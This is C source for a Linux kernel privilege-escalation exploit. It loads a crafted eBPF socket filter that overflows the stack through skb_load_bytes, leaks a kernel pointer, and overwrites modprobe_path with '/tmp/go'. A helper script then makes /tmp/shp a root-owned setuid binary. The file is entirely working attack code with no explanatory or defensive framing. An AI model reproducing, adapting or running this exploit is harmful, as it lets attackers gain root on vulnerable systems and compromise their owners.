#include "bpf_insn.h"
#define BPF_DEBUG
#include "kutil.h"
#include <linux/bpf.h>

void write_modprobe_path(unsigned long value) {
  union bpf_attr attr = {

      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = sizeof(int),
      .value_size = 8,
      .max_entries = 1

  };

  int mapfd = bpf_map_create(&attr);

  unsigned long leak = 0xdeadbeef;
  bpf_map_update_elem(mapfd, 0, &leak, BPF_ANY);

#define BPF_CTX BPF_REG_9
#define BPF_BAD_VAL BPF_REG_8
#define BPF_BAD_FP BPF_REG_7
#define BPF_LEAKED_MAP BPF_REG_6
#define BPF_ELEM BPF_REG_5
#define BPF_MODPROBE_PATH BPF_REG_6

  struct bpf_insn insns[] = {

      BPF_MOV64_REG(BPF_CTX, BPF_REG_1),

      /* BAD_VAL = (1, 9) */
      BPF_MOV64_IMM(BPF_REG_1, 1),
      BPF_MOV32_IMM(BPF_REG_2, 32),
      BPF_ALU32_REG(BPF_LSH, BPF_REG_1, BPF_REG_2),
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 0x08),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, 0x01),
      BPF_MOV64_REG(BPF_BAD_VAL, BPF_REG_1),

      BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_FP, -0x8),
      BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x10, 0),

      /* skb_load_bytes(skb, offset, to, len); */
      /* BAD_FP = BPF_REG_FP + 0x8; */
      BPF_MOV64_REG(BPF_REG_1, BPF_CTX),
      BPF_MOV64_IMM(BPF_REG_2, 0),
      BPF_MOV64_REG(BPF_REG_3, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
      BPF_MOV64_REG(BPF_REG_4, BPF_BAD_VAL),
      BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
      BPF_LDX_MEM(BPF_DW, BPF_BAD_FP, BPF_REG_FP, -0x8),

      BPF_LD_MAP_FD(BPF_REG_1, mapfd),
      BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, -0x8),
      BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x10, 0xdeadbeef),
      BPF_LDX_MEM(BPF_DW, BPF_LEAKED_MAP, BPF_BAD_FP, -0x10),

      /* bpf_map_lookup_elem(mapfd, &key); */
      BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0),
      BPF_LD_MAP_FD(BPF_REG_1, mapfd),
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
      BPF_EXIT_INSN(),
      BPF_MOV64_REG(BPF_ELEM, BPF_REG_0),

      BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_ELEM, -0x8),
      BPF_STX_MEM(BPF_DW, BPF_BAD_FP, BPF_LEAKED_MAP, -0x10),
      BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_FP, -0x8),
      BPF_LDX_MEM(BPF_DW, BPF_MODPROBE_PATH, BPF_REG_1, 0),
      BPF_ALU64_IMM(BPF_ADD, BPF_MODPROBE_PATH, -0xc12dc0 + 0xe38340),

      BPF_MOV64_IMM(BPF_REG_1, value >> 32),
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, value & 0xffffffff),

      BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_ELEM, -0x8),
      BPF_STX_MEM(BPF_DW, BPF_BAD_FP, BPF_MODPROBE_PATH, -0x10),
      BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_FP, -0x8),
      BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0),
      BPF_EXIT_INSN(),
  };

#undef BPF_CTX
#undef BPF_BAD_VAL
#undef BPF_BAD_FP
#undef BPF_LEAKED_MAP
#undef BPF_ELEM
#undef BPF_MODPROBE_PATH

  int bpfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns,
                           sizeof(insns) / sizeof(struct bpf_insn));

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    ABORT("socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &bpfd, sizeof(int)))
    ABORT("setsockopt");

  write(socks[1], "XXXXXXXX\xb8", 0x9);
}

int main(void) {
  char *sh = "/tmp/go\x00";
  write_modprobe_path(*(unsigned long *)sh);
  prepare_script("/tmp/go",
                 "#!/bin/sh\n chown root:root /tmp/shp\n chmod +s /tmp/shp");
  exec_modprobe_path("/tmp/trigger");
}
